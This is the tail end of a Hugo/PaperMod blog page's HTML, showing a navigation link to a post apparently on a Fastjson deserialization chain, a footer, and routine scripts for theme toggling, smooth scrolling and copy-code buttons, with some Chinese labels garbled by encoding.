    <br>
    <span>FastjsonåŸç”Ÿé“¾</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://Jiecub3.github.io/zh/">Jiecub3</a></span> Â· 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'å¤åˆ¶';

        function copyingDone() {
            copybutton.innerHTML = 'å·²å¤åˆ¶ï¼';
            setTimeout(() => {
                copybutton.innerHTML = 'å¤åˆ¶';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
